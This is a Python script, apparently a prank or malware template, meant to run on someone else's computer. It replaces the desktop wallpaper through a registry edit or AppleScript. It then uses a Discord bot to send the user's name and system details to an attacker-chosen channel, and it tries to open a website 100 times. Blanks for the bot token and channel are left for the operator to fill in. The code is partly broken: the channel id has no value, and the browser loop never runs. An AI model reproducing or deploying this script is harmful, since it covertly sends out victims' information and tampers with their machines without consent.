import discord
import getpass
import platform
import requests
import os
import ctypes
import webbrowser 


#set these values
image_url = "" #wallpaper url

response = requests.get(image_url)
with open("wallpaper.jpg", "wb") as f:
    f.write(response.content)

if os.name == "nt":  # Windows
    os.system('reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "%s" /f' % os.path.abspath("wallpaper.jpg"))
    os.system('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')
else:  # macOS or Linux
    os.system("osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"%s\"'" % os.path.abspath("wallpaper.jpg"))





intents = discord.Intents.default()
client = discord.Client(intents=intents)

TOKEN = "" #discord bot token

CHANNEL_ID = #discord chanel id

@client.event
async def on_ready():
    print(f"Logged in as {client.user.name} ({client.user.id})")
    username = getpass.getuser()
    channel = client.get_channel(CHANNEL_ID)
    system = platform.system()
    machine = platform.machine()
    release = platform.release()
    processor = platform.processor()
    arch = platform.architecture()
    uname = platform.uname()
    await channel.send(f"""
        NEW USER:{username}
        machine: {machine}
        system : {system}
        release: {release}
        processpr:{processor}
        architechtor:{arch}


        """)

client.run(TOKEN)
x = 1
while x <= 100:
    url = 'www.youtube.com' #change this acording to ur desire 
    webbrowser.open(url)
    x = x+1
